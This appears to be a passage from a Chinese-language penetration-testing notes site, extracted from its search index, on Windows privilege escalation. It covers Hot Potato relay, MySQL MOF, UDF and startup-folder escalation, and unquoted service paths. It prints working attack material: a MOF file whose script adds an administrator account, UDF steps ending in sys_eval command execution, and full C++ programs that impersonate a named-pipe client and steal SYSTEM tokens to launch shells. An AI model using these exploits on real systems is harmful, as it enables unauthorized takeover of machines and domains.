.\u4f46\u662fnbns\u6d41\u91cf\u5305\u8fd8\u6709\u4e2a\u53eb\u7279\u5f81\u7801\u7684\u4e1c\u897f\uff0c\u8bf7\u6c42\u5305\u548c\u54cd\u5e94\u5305\u7684\u7279\u5f81\u7801\u5fc5\u987b\u76f8\u540c\uff0c\u6240\u4ee5\u6211\u4eec\u88ab\u8feb\u53d1\u900165536\u4e2a\u5305\u7206\u7834\u8fd9\u4e2a\u7279\u5f81\u7801\u2014\u2014\u672c\u5730\u53d1\u5305\u901f\u5ea6\u5f88\u5feb\uff0c\u672c\u5730NBNS\u6b3a\u9a97\u6210\u529f\u7387\u57fa\u672c\u4e0a\u5728100%\u3002 2.WPAD\u52ab\u6301 NBNS\u6b3a\u9a97\u540e\u6211\u4eec\u5c31\u53ef\u4ee5\u52ab\u6301WPAD\u7684\u57df\u540d\uff0c\u628a\u81ea\u5df1\u4f2a\u9020\u79f0WPAD\u5e76\u8fd4\u56de\u81ea\u5b9a\u4e49\u7684PAC\u6587\u4ef6\u3002\u610f\u5473\u7740\u6211\u4eec\u53ef\u4ee5\u628a\u672c\u5730\u53d1\u51fa\u7684\u6240\u6709\u6d41\u91cf\u91cd\u5b9a\u5411\u3002 3.RELAY \u5728\u73b0\u5728\u8fd9\u4e2a\u5e74\u4ee3\uff0cSMB->SMB\u7684relay\u5f88\u5c11\u7528\u5230\u4e86\uff0c\u5fae\u8f6f \u7981\u7528\u4e86\u540c\u534f\u8bae\u7684NTLM\u8ba4\u8bc1 \uff0c\u6210\u529f\u7387\u5f88\u4f4e\u3002 \u4f46\u662fHTTP->SMB\u7684relay\u8fd8\u662f\u6709\u7684\u3002HOT POTATO\u5c31\u662f\u5229\u7528\u7684\u8fd9\u4e00\u70b9\u3002 \u6211\u4eec\u53ef\u4ee5\u628a\u4e3b\u673a\u53d1\u51fa\u7684HTTP\u8bf7\u6c42\u91cd\u5b9a\u5411\u5230\u6211\u4eec\u81ea\u5b9a\u4e49\u7684\u7f51\u9875A\uff0c\u800c\u7f51\u9875A\u9700\u8981NTLM\u8ba4\u8bc1\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u8fdb\u884cHTTP->SMB\u7684relay\u2019\u4e86\u3002\u5f53HTTP\u8bf7\u6c42\u6765\u81ea\u4e8e\u9ad8\u6743\u9650\u7684\u8d26\u6237\u65f6\uff0c\u4f8b\u5982\u662f\u6765\u81eawindows \u66f4\u65b0\u670d\u52a1\u7684\u8bf7\u6c42\uff0c\u547d\u4ee4\u5c31\u4f1a\u4ee5\u201dNT AUTHORITY\\SYSTEM\u201d\u6743\u9650\u8fd0\u884c\u3002 HOT POTATO \u6839\u636eWindows\u7248\u672c\u7684\u4e0d\u540c\uff0c\u9700\u8981\u7b49\u5f85\u9ad8\u6743\u9650\u7528\u6237NTLM\u8ba4\u8bc1\u6765\u5230\u7684\u65f6\u95f4\u4e5f\u4e0d\u540c\u3002\u4e00\u822c\u6765\u8bf4\uff0c WIN7\u662f\u77ac\u95f4\u5c31\u53ef\u4ee5\u63d0\u6743\u7684 Windows Server 2012 R2,Windows Server 2012,Windows 8.1,Windows 8\u6709\u4e00\u4e2a\u81ea\u52a8\u66f4\u65b0\u673a\u5236\uff0c\u4f1a\u6bcf\u5929\u4e0b\u8f7d\u8bc1\u4e66\u4fe1\u4efb\u5217\u8868(CTLs) ,etc MYSQL\u4e0b\u7684\u63d0\u6743\u6280\u672f MOF\u63d0\u6743 \u5728c:/windows/system32/wbem/mof/\u76ee\u5f55\u4e0b\u7684nullevt.mof\u6bcf\u5206\u949f\u90fd\u4f1a\u6709\u4e00\u4e2a\u7279\u5b9a\u7684\u65f6\u95f4\u53bb\u6267\u884c\u4e00\u6b21\uff08\u7531\u201dAnd TargetInstance.Second = 5\u2033;\u63a7\u5236\uff0c\u8fd9\u91cc\u8f93\u51655\u5c31\u662f\u6bcf\u5206\u949f\u7684\u7b2c\u4e94\u79d2\u6267\u884c\u3002 \u90a3\u4e48\u628acmd\u547d\u4ee4\u6dfb\u52a0\u5230nullevt.mof\u4e2d\uff0ccmd\u547d\u4ee4\u5c31\u4f1a\u81ea\u52a8\u6267\u884c\u4e86\u3002 \u524d\u63d0\u662f\u6211\u4eec\u8981\u80fd\u8fdb\u5165\u6570\u636e\u5e93\u8fdb\u884c\u64cd\u4f5c\uff0c\u4e14mysql\u6570\u636e\u5e93\u7684\u6743\u9650\u5c3d\u53ef\u80fd\u9ad8\u624d\u66f4\u6709\u5229\u3002\u540c\u65f6secure-file-priv \u8981\u4e3a\u7a7a\uff08 mysql 5.6.34\u7248\u672c\u4ee5\u540e secure_file_priv\u7684\u503c\u9ed8\u8ba4\u4e3aNULL,\u7981\u6b62\u6240\u6709\u6587\u4ef6\u5bfc\u5165\u5bfc\u51fa\u529f\u80fd\uff09 \u6211\u4eec\u4f2a\u9020\u7684MOF\u6587\u4ef6\u683c\u5f0f\u5982\u4e0b #pragma namespace(\"\\\\\\\\.\\\\root\\\\subscription\") instance of __EventFilter as $EventFilter { EventNamespace = \"Root\\\\Cimv2\"; Name = \"filtP2\"; Query = \"Select * From __InstanceModificationEvent \" \"Where TargetInstance Isa \\\"Win32_LocalTime\\\" \" \"And TargetInstance.Second = 5\"; QueryLanguage = \"WQL\"; }; instance of ActiveScriptEventConsumer as $Consumer { Name = \"consPCSV2\"; ScriptingEngine = \"JScript\"; ScriptText = \"var WSH = new ActiveXObject(\\\"WScript.Shell\\\")\\nWSH.run(\\\"net.exe user admin admin /add\\\")\"; //\u4fee\u6539\u6b64\u5904\u5373\u53ef }; instance of __FilterToConsumerBinding { Consumer = $Consumer; Filter = $EventFilter; }; \u4fee\u6539\u4e0a\u9762\u7684cmd\u90e8\u5206\u5373\u53ef\u5b9e\u73b0\u4ee5\u7ba1\u7406\u5458\u8eab\u4efd\u6267\u884c\u5404\u79cd\u547d\u4ee4\u3002 \u7136\u540e\u6211\u4eec\u4f7f\u7528mysql\u4e0b\u7684\u547d\u4ee4 \uff0c\u5c06mof\u8986\u76d6\u8fc7\u53bb\u3002 \u5f85\u6211\u4eec\u7684\u547d\u4ee4\u88ab\u6267\u884c\u540e\uff0c\u5373\u4ee3\u8868\u63d0\u6743\u6210\u529f\u3002 Windows 2003\u4f3c\u4e4e\u6210\u529f\u7387\u86ee\u9ad8\u7684\uff0cWIN7\u8bd5\u4e86\u8bd5\u6ca1\u53cd\u5e94\u3002\u3002\u3002 UDF\u63d0\u6743 \uff08\u8fd9\u4e2a\u4e5f\u53ef\u4ee5linux\u63d0\u6743 udf\uff0c\u5373\u81ea\u5b9a\u4e49\u51fd\u6570\uff08user define function\uff09 MYSQL\u53ef\u4ee5\u81ea\u5b9a\u4e49\u51fd\u6570\u7684\u3002\u81ea\u5b9a\u4e49\u51fd\u6570\u5728Windows\u4e0b\u662f\u4ee5DLL\u6587\u4ef6\u5b58\u5728\u4e8eMYSQL\u7684\u63d2\u4ef6\u6587\u4ef6\u5939\u91cc\u9762\u7684\uff08linux\u5219\u662f\u4ee5os\u7684\u5f62\u5f0f\uff09\u3002\u6211\u4eec\u53ef\u4ee5\u81ea\u5b9a\u4e49\u4e00\u4e2a\u6076\u610fdll\uff0c\u91cc\u9762\u5b58\u653e\u7740\u53ef\u4ee5\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u7684 \u51fd\u6570\u3002\u7136\u540e\u4ea4\u7ed9mysql\u4ee5\u6570\u636e\u5e93\u6743\u9650\u6267\u884c\u3002 \u524d\u63d0\uff1a\u6211\u4eec\u80fd\u64cd\u4f5c\u6570\u636e\u5e93\uff0c\u4e14\u6570\u636e\u5e93\u6743\u9650\u5fc5\u987b\u5f88\u9ad8\uff08\u6211\u4eec\u7528\u8fd9\u4e2a\u65b9\u6cd5\u63d0\u6743\u5230\u7684\u6743\u9650\u5c31\u662f\u6570\u636e\u5e93\u7684\u6743\u9650 \u90a3\u4e48\u8fd9\u4e2adll\u6587\u4ef6\u54ea\u91cc\u6765\u5462\u3002sqlmap\u548cmsf\u90fd\u6709\u3002sqlmap\u4e0b\u7684 sqlmap/data/udf/mysql/windows/64/lib_mysqludf_sys.dll_ \u5c31\u662f\u8fd9\u4e2adll\u6587\u4ef6\u7684\u7f16\u7801\u7248\u672c\u3002\u6211\u4eec\u4f7f\u7528sqlmap\u4e0b\u7684sqlmap/extra/cloak/cloak.py\u5bf9\u5176\u8fdb\u884c\u89e3\u7801\u83b7\u5f97dll\u6587\u4ef6\u3002 python ./cloak.py -d -i ./lib_mysqludf_sys.dll_ \u5373\u53ef\u83b7\u5f97dll\u6587\u4ef6 \u7136\u540e\u6211\u4eec\u628adll\u6587\u4ef6\u653e\u5165mysql\u7684\u63d2\u4ef6\u6587\u4ef6\u5939\uff0c\u547d\u540d\u4e3audf.dll\u3002\u63d2\u4ef6\u6587\u4ef6\u5939\u53ef\u4ee5\u901a\u8fc7\u547d\u4ee4 show variables like \"%plugin%\";\u83b7\u5f97 \uff08/lib/plugin\u6587\u4ef6\u5939\u9700\u8981\u81ea\u5df1\u521b\u5efa\uff09 \u81f3\u4e8e\u600e\u4e48\u628adll\u653e\u5165\u63d2\u4ef6\u6587\u4ef6\u5939 1.\u76f4\u63a5\u7c98\u8d34\u590d\u5236 \uff08\u6743\u9650\u53ef\u80fd\u4e0d\u591f 2.\u4f7f\u7528\u547d\u4ee4 select load_file(\u2018udf.dll\u2019) into dumpfile \u201cPLUGIN\u7684\u8def\u5f84\u201d;(\u9700\u8981secure_file_priv\u4e3a\u7a7a \u603b\u4e4b\uff0c\u5982\u679c\u628audf.dll\u653e\u5165plugin\u6587\u4ef6\u5939\u540e\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u6267\u884c\u4ee5\u4e0b\u64cd\u4f5c\u63d0\u6743\u4e86\u3002 create funtion sys_eval returns string soname \"udf.dll\"; select sys_eval('cmd'); \u542f\u52a8\u9879\u63d0\u6743 \u8bf4\u767d\u4e86\uff0c\u5c31\u662f\u901a\u8fc7mysql\u7684\u9ad8\u6743\u9650\uff0c\u5411windows\u5f00\u673a\u542f\u52a8\u9879\u6587\u4ef6\u5939\u91cc\u653e\u5165\u6076\u610fvbs\u6216\u8005bat\u811a\u672c,\u673a\u5668\u91cd\u542f\u540e\u81ea\u52a8\u6267\u884c\u3002\u600e\u4e48\u8ba9\u673a\u5668\u91cd\u542f\uff1f\u7b49\u7ba1\u7406\u5458\u6216\u8005 \u4e00\u4e9b\u53ef\u5bfc\u81f4\u670d\u52a1\u5668\u84dd\u5c4f\u7684EXP \u542f\u52a8\u9879\u8def\u5f84\u4e00\u822c\u4e3a\uff1a C:\\Documents and Settings\\All Users\\\u300c\u5f00\u59cb\u300d\u83dc\u5355\\\u7a0b\u5e8f\\\u542f\u52a8 C:\\Users\\username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup select load_file(\"xxx\") into dumpfile \"xxxx\"; \u6ca1\u4ec0\u4e48\u597d\u8bf4\u7684 \u547d\u540d\u7ba1\u9053\u63d0\u6743 \u63d0\u6743\u65b9\u5f0f\u4e3a \u4ee4\u724c\u6a21\u4eff\u3002 Token Impersonation . meterpreter\u7684getsystem\u7684\u63d0\u53d6\u65b9\u6cd5\u4e4b\u4e00\u5c31\u662f\u8fd9\u4e2a\u65b9\u6cd5 \u63d0\u6743\u8fc7\u7a0b\u4e3a\u4eceadministrator\u7528\u6237\u63d0\u5230SYSTEM\u6743\u9650\u3002\u4ece\u666e\u901a\u7528\u6237\u63d0\u6743\u5230admin\u53ca\u4ee5\u4e0a\u6743\u9650\u662f\u4e0d\u53ef\u53d6\u7684\uff0c\u56e0\u4e3a\u666e\u901a\u7528\u6237\u521b\u5efa\u7684\u547d\u540d\u7ba1\u9053\u6ca1\u6709 SeImpersonatePrivilege \uff0c\u5728\u590d\u5236\u4ee4\u724c\u65f6\u4f1a\u51fa\u73b01346\u9519\u8bef\u3002 \u8be5\u65b9\u6cd5\u6280\u672f\u7ec6\u8282\u4e3a\uff1a\u4ee5\u7ba1\u7406\u5458\u6743\u9650\u521b\u5efa\u4e00\u4e2a\u547d\u540d\u7ba1\u9053\uff0c\u518d\u901a\u8fc7\u521b\u5efaSYSTEM\u6743\u9650\u670d\u52a1\uff0c\u8ba9\u670d\u52a1\u8fde\u4e0a\u547d\u540d\u7ba1\u9053\uff0c\u968f\u540e\u6211\u4eec\u901a\u8fc7\u6a21\u62df\u5ba2\u6237\u7aef\uff0c\u83b7\u5f97SYSTEM\u6743\u9650\u7684\u4ee4\u724c\uff0c\u968f\u540e\u5c06\u5176\u590d\u5236\uff0c\u518d\u7528\u590d\u5236\u540e\u7684\u4ee4\u724c\u521b\u5efa\u65b0\u8fdb\u7a0b\uff08\u5982CMD)\uff0c\u65b0\u8fdb\u7a0b\u7684\u6743\u9650\u5373SYSTEM\u6743\u9650\u3002 \u8fd9\u91cc\u8d34\u4e0a\u5b9e\u73b0\u4ee3\u7801. \u9996\u5148\u662f\u88ab\u521b\u5efa\u7684\u670d\u52a1\u7684\u5b9e\u73b0\u4ee3\u7801\uff0c\u8be5\u670d\u52a1\u542f\u52a8\u540e\u4f1a\u4e0d\u65ad\u5411\u670d\u52a1\u5668\u547d\u540d\u7ba1\u9053\u5efa\u7acb\u94fe\u63a5 \u751f\u6210\u597d\u540e\uff0c\u662fService.exe #include<Windows.h> #include<iostream> SERVICE_STATUS m_ServiceStatus; SERVICE_STATUS_HANDLE m_ServiceStatusHandle; BOOL bRunning; void WINAPI ServiceMain(DWORD argc, LPTSTR* argv); void WINAPI HandlerFunc(DWORD code); int main() { WCHAR Servicename[] = L\"ServiceA\"; SERVICE_TABLE_ENTRY Table[] = { {Servicename,ServiceMain},{NULL,NULL} }; StartServiceCtrlDispatcher(Table); } void WINAPI ServiceMain(DWORD argc, LPTSTR* argv) { m_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS; m_ServiceStatus.dwCurrentState = SERVICE_START_PENDING; m_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP; m_ServiceStatus.dwWin32ExitCode = 0; m_ServiceStatus.dwServiceSpecificExitCode = 0; m_ServiceStatus.dwCheckPoint = 0; m_ServiceStatus.dwWaitHint = 0; m_ServiceStatusHandle = RegisterServiceCtrlHandler(L\"ServiceA\", HandlerFunc); m_ServiceStatus.dwCurrentState = SERVICE_RUNNING; m_ServiceStatus.dwCheckPoint = 0; m_ServiceStatus.dwWaitHint = 0; SetServiceStatus(m_ServiceStatusHandle, &m_ServiceStatus); bRunning = true; while (bRunning) { LPCWSTR PipeName = L\"\\\\\\\\.\\\\pipe\\\\testpipe\"; HANDLE PipeHandle=NULL; BOOL PipeInstance; WCHAR message[512] = { 0 }; DWORD bytesWritten = 0; BOOL Flag = true; wchar_t message2[] = L\"HELL\"; DWORD messageLength = lstrlen(message2) * 2; do { PipeHandle = CreateFile(PipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL); } while (PipeHandle == INVALID_HANDLE_VALUE); WriteFile(PipeHandle, &message2, messageLength, &bytesWritten, NULL); Flag = ReadFile(PipeHandle, &message, 512, &bytesWritten, NULL); std::cout << \"Message:\" << message << std::endl; } } void WINAPI HandlerFunc(DWORD code) { switch (code) { case SERVICE_CONTROL_PAUSE: m_ServiceStatus.dwCurrentState = SERVICE_PAUSED; break; case SERVICE_CONTROL_CONTINUE: m_ServiceStatus.dwCurrentState = SERVICE_RUNNING; break; case SERVICE_CONTROL_STOP: m_ServiceStatus.dwWin32ExitCode = 0; m_ServiceStatus.dwCurrentState = SERVICE_STOPPED; m_ServiceStatus.dwCheckPoint = 0; m_ServiceStatus.dwWaitHint = 0; SetServiceStatus(m_ServiceStatusHandle, &m_ServiceStatus); bRunning = false; break; case SERVICE_CONTROL_INTERROGATE: break; } } \u7136\u540e\u662f\u4e3b\u4f53\uff0c\u547d\u540d\u7ba1\u9053\u670d\u52a1\u5668\u3002\u751f\u6210\u540e\u662fServer.exe #include<Windows.h> #include<iostream> int main() { LPCWSTR pipeName = L\"\\\\\\\\.\\\\pipe\\\\testpipe\"; LPVOID pipeBuffer = NULL; HANDLE serverPipe; DWORD readBytes = 0; DWORD readBuffer = 0; int err = 0; BOOL isPipeConnected; BOOL isPipeOpen; wchar_t message[] = L\"HELL\"; DWORD messageLenght = lstrlen(message) * 2; DWORD bytesWritten = 0; WCHAR message2[512] = { 0 }; //Open a Named Pipe,Wait for a connection std::wcout << \"Creating named pipe \" << pipeName << std::endl; serverPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL); //Create a service of system to connect to our NamedPipe. char servicename[] = \"Service.exe\"; char servicepath[_MAX_PATH]; SERVICE_STATUS status; GetModuleFileNameA(LoadLibraryA(servicename), servicepath, sizeof(servicepath)); SC_HANDLE scManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS); if (GetLastError() == 0) { } else { std::cout << \"ERROR OpenSCManager:\" << GetLastError() << std::endl; } SC_HANDLE scService = CreateServiceA(scManager, servicename, servicename, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL, servicepath, NULL, NULL, NULL, NULL, NULL); if (!scService) { if (GetLastError() == 1073) { std::cout << \"The Service has been exsisted\" << std::endl; } else { std::cout << \"ERROR CreateServiceA:\" << GetLastError() << std::endl; } } SC_HANDLE scServiceA = OpenServiceA(scManager, servicename, SERVICE_ALL_ACCESS); if (StartService(scServiceA, 0, NULL)) { std::cout<<\"service Start success\"<<std::endl; } else { if (GetLastError() == 1056) { std::cout << \"service is running,don't need to start again\" << std::endl; } } //Connect ! isPipeConnected = ConnectNamedPipe(serverPipe, NULL); if (isPipeConnected) { std::wcout << \"Incoming connection to \" << pipeName << std::endl; ReadFile(serverPipe, &message2, 512, &bytesWritten, NULL); std::cout << message2; } else { std::cout << \"Does not connected Error: \"<<GetLastError() << std::endl; } std::wcout << \"Sending message: \" << message << std::endl; WriteFile(serverPipe, message, messageLenght, &bytesWritten, NULL); //Toekn Impersonation std::wcout << \"Impersonating the client...\" << std::endl; if (!ImpersonateNamedPipeClient(serverPipe)) { std::cout<<\"ImpersonateNamedPipeClient ERROR: \"<<GetLastError()<<std::endl; } else { std::cout << \"ImpersonateNamedPipeClient success\" << std::endl; } STARTUPINFOA si; PROCESS_INFORMATION pi = {}; ZeroMemory(&pi, sizeof(pi)); ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si); HANDLE token; if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &token)) { std::cout << \"GetCurrentThread ERROR:\" << GetLastError() << std::endl; } CHAR command1[] = \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\"; WCHAR command2[] = L\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\"; HANDLE Token; if (!DuplicateTokenEx(token, TOKEN_ALL_ACCESS,NULL, SecurityImpersonation, TokenImpersonation,&Token)) { std::cout << \"DuplicateTokenEx ERROR:\" << GetLastError() << std::endl; } else { std::cout << \"Impersonate completed\" << std::endl; } if (!CreateProcessAsUserA(token, NULL, command1, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) { std::cout << \"CreateProcessAsUserA ERROR:\" << GetLastError() <<\" Now Use CreateProcessWithTokenW\"<< std::endl; if (!CreateProcessWithTokenW(token, LOGON_NETCREDENTIALS_ONLY, NULL, command2, NULL, NULL, NULL, (LPSTARTUPINFOW)&si, &pi)) { std::cout << \"CreateProcessWithTokenW ERROR:\" << GetLastError() << std::endl; } else { std::cout << \"CreateProcessWithTokenW success\" << std::endl; } } else { std::cout << \"CreateProcessWithTokenW success\" << std::endl; } while(1){} } \u6211\u4eec\u751f\u6210\u4e86Service.exe,\u7136\u540e\u628a\u4ed6\u79fb\u5230Server.exe\u540c\u7ea7\u76ee\u5f55\uff0c\u4ee5\u7ba1\u7406\u5458\u6743\u9650\u8fd0\u884cServer.exe,\u5373\u53ef\u8fbe\u5230admin-\u300bsystem\u7684\u63d0\u6743\u3002 \u7a0b\u5e8f\u5199\u4e86\u56db\u5929\u7ec8\u4e8e\u5199\u597d\u4e86\u3002\u3002WIN7\u4e0b\u53ef\u4ee5\u5b9e\u73b0\u5b8c\u7f8e\u63d0\u6743\u3002 \u9879\u76ee\u5730\u5740: https://github.com/ConsT27/EvilNamedPipe/tree/1.0 \u4ee4\u724c\u7a83\u53d6 SYSTEM->\u672c\u673a\u4e0a\u5176\u4ed6\u7528\u6237\uff08\u5305\u62ec\u57df\u7528\u6237\uff09(\u597d\u5bb6\u4f19\uff0c\u53ea\u8981\u672c\u673a\u6709system\u6743\u9650\uff0c\u57df\u7ba1\u6562\u5728\u672c\u673a\u4e0a\u521b\u5efa\u8fdb\u7a0b\u5c31\u76f4\u63a5\u80fd\u62ff\u5230\u57df\u7ba1\u6743\u9650\uff09 \u6216\u8005admin\u83b7\u53d6debug\u6743\u9650\u540e\u53bb\u83b7\u53d6SYSTEM\u6743\u9650\uff08\u8fd9\u91cc\u6709\u4e00\u4e2a\u7ec6\u8282\u70b9\uff0c\u53ea\u6709owner\u4e3aadministrator\u7684SYSTEM\u8fdb\u7a0b\u624d\u80fd\u88ab\u5229\u7528\uff0c\u6bd4\u5982lsass\uff0cdllhost) \u6280\u672f\u7ec6\u8282:\u901a\u8fc7\u5bfb\u627e\u9ad8\u6743\u9650\u5f00\u542f\u7684\u8fdb\u7a0b\uff0c\u518d\u590d\u5236\u5176\u4ee4\u724c\u7528\u4ee5\u521b\u5efa\u65b0\u8fdb\u7a0b\uff0c\u5373\u53ef\u8fbe\u5230\u63d0\u6743\u76ee\u7684 #include <iostream> #include <Windows.h> //Only administrator can get debug priv BOOL GetDebugPriv() { HANDLE Token; TOKEN_PRIVILEGES tp; LUID Luid; if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &Token)) { std::cout << \"OpenProcessToken ERROR\" << GetLastError() << std::endl; return false; } tp.PrivilegeCount = 1; tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &Luid)) { std::cout << \"LookupPrivilegeValue ERROR\" << GetLastError() << std::endl; return false; } tp.Privileges[0].Luid = Luid; if (!AdjustTokenPrivileges(Token, FALSE, &tp, sizeof(tp), NULL, NULL) ){ std::cout << \"AdjustTokenPrivileges ERROR\" << GetLastError() << std::endl; return false; } if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) { return false; } else { return true; } } int main(int argc, char* argv[]) { HANDLE t_process; HANDLE token = NULL; HANDLE token_bak = NULL; DWORD process_id; sscanf_s(argv[1], \"%ul\", &process_id); WCHAR command[] = L\"C:\\\\Windows\\\\System32\\\\cmd.exe\"; STARTUPINFO startupInfo; PROCESS_INFORMATION processInformation; ZeroMemory(&startupInfo, sizeof(STARTUPINFO)); ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION)); startupInfo.cb = sizeof(STARTUPINFO); std::cout << argv[1] << std::endl; std::cout << \"Openning process PID:\" << process_id << std::endl; if (GetDebugPriv()== TRUE) { std::cout << \"Got the debug priv\" << std::endl; } else { std::cout << \"GetDebugPriv ERROR\" << std::endl; } system(\"whoami /priv\"); t_process = OpenProcess(PROCESS_ALL_ACCESS, true, process_id); if (!t_process) { std::cout << \"OpenProcess ERROR\" << GetLastError() << std::endl; } if (!OpenProcessToken(t_process, TOKEN_ALL_ACCESS, &token)) { std::cout << \"OpenProcessToken ERROR\" << GetLastError() << std::endl; } if (!DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &token_bak)) { std::cout << \"DuplicateTokenEx ERROR\" << GetLastError() << std::endl; } if (!CreateProcessWithTokenW(token_bak, LOGON_WITH_PROFILE, NULL, command, 0, NULL, NULL, &startupInfo, &processInformation)) { std::cout << \"CreateProcessWithTokenW ERROR\" << GetLastError() << std::endl; } return 0; } \u8fd9\u662f\u5728win7\u4e0b\u7684\u6d4b\u8bd5\u7ed3\u679c const\\administrator \u662f\u57df\u63a7","title":"Windows\u63d0\u6743"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/#windows","text":"","title":"Windows\u63d0\u6743"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/#_1","text":"\u65e0\u5f15\u53f7\u670d\u52a1\u8def\u5f84 \uff08 Trusted Service Paths \uff09 \u6613\u53d7\u653b\u51fb\u7684\u670d\u52a1\uff08Vulnerable Services \uff09 AlwaysInstallElevated \u4fe1\u606f\u6cc4\u9732 \u57fa\u4e8e\u8d44\u6e90\u7684\u57df\u59d4\u6d3e\u653b\u51fb \u539f\u7406\u7684\u51e0\u4e2a\u70b9\uff1a \u653b\u51fb\u6d41\u7a0b: \u5b9e\u64cd \u654f\u611f\u7528\u6237\u4e0d\u53ef\u59d4\u6d3e\u7684\u7ed5\u8fc7 POTATO \u5bb6\u65cf hot potato MYSQL\u4e0b\u7684\u63d0\u6743\u6280\u672f MOF\u63d0\u6743 UDF\u63d0\u6743 \u542f\u52a8\u9879\u63d0\u6743 \u547d\u540d\u7ba1\u9053\u63d0\u6743 \u4ee4\u724c\u7a83\u53d6","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/#trusted-service-paths","text":"\u5148\u8bf4\u5b9e\u7528\u5ea6\uff0c\u6bd4\u8f83\u88ab\u52a8\uff0c\u800c\u4e14\u6bd4\u8f83\u770b\u8138\u3002 Windows\u4e0b\u670d\u52a1\u7684\u6743\u9650\u901a\u5e38\u662fSYSTEM\u3002\u5982\u679c\u6211\u4eec\u80fd\u591f\u66ff\u6362\u670d\u52a1\u7684\u542f\u52a8\u7a0b\u5e8f\u4e3a\u6211\u4eec\u7684\u6076\u610f\u7a0b\u5e8f\uff08\u5982\u53cd\u5f39shell\uff09\uff0c\u5373\u76f8\u5f53\u4e8e\u83b7\u5f97\u4e86SYSTEM\u6743\u9650\uff0c\u8fbe\u5230\u4e86\u63d0\u6743\u7684\u76ee\u7684\u3002 \u65e0\u5f15\u53f7\u670d\u52a1\u8def\u5f84\u6709\u53ef\u80fd\u4f1a\u5bfc\u81f4\u8fd9\u79cd\u60c5\u51b5\u7684\u53d1\u751f\u3002 \u6240\u8c13\u65e0\u5f15\u53f7\u670d\u52a1\u8def\u5f84\uff0c\u5c31\u662f\u670d\u52a1\u542f\u52a8\u7a0b\u5e8f\u7684\u8def\u5f84\u4e2d\u5305\u542b\u4e86\u7a7a\u683c\u4e14\u672a\u88ab\u5f15\u53f7\u5305\u542b\u8d77\u6765\u3002\u6bd4\u5982\u8fd9\u6837 C:\\Program Files\\floder1\\service.exe \u56e0\u4e3a\u7a7a\u683c\u7684\u5b58\u5728\uff0cWindows\u5728\u542f\u52a8\u670d\u52a1\u627e\u5bfb\u670d\u52a1\u542f\u52a8\u9879\u65f6\uff0c\u5b83\u4f1a\u6309\u7167\u4ee5\u4e0b\u987a\u5e8f\u8fdb\u884c\u542f\u52a8\u9879\u5bfb\u627e C:\\Program.exe C:\\Program Files\\Some.exe C:\\Program Files\\Some Folder\\Service.exe \u8fd9\u5c31\u7ed9\u4e86\u6211\u4eec\u6709\u673a\u53ef\u4e58\u7684\u673a\u4f1a\uff1a\u5982\u679c\u6211\u4eec\u5728\u670d\u52a1\u7684\u4e0a\u5c42\u76ee\u5f55\u6709\u5199\u5165\u6216\u5b8c\u5168\u63a7\u5236\u6743\u9650\uff0c\u6211\u4eec\u5b8c\u5168\u53ef\u4ee5\u5c06\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u653e\u5728Windows\u641c\u5bfb\u670d\u52a1\u542f\u52a8\u9879\u7684\u66f4\u9760\u524d\u987a\u5e8f\u4e0a\u3002 \u6211\u4eec\u7528\u4ee5\u4e0b\u547d\u4ee4\u6765\u641c\u7d22\u54ea\u4e9b\u670d\u52a1\u8def\u5f84\u6ca1\u6709\u5305\u542b\u5f15\u53f7 wmic service get name,displayname,pathname,startmode |findstr /i \"Auto\" |findstr /i /v \"C:\\Windows\\\\\" |findstr /i /v \"\"\" \u627e\u5230\u4e00\u4e2a\u3002\u63a5\u4e0b\u6765\u6211\u4eec\u7684\u601d\u8def\u53ef\u80fd\u5c31\u662f\u57282345Explorer\u76ee\u5f55\u4e0b\u521b\u5efa\u4e00\u4e2aProtect.exe\u4e86\uff0c\u6240\u4ee5\u6211\u4eec\u8981\u770b\u770b2345Explorer\u76ee\u5f55\u6211\u4eec\u7684\u6743\u9650\u5982\u4f55\u3002 \u5148\u6765\u4e00\u624bwhoami 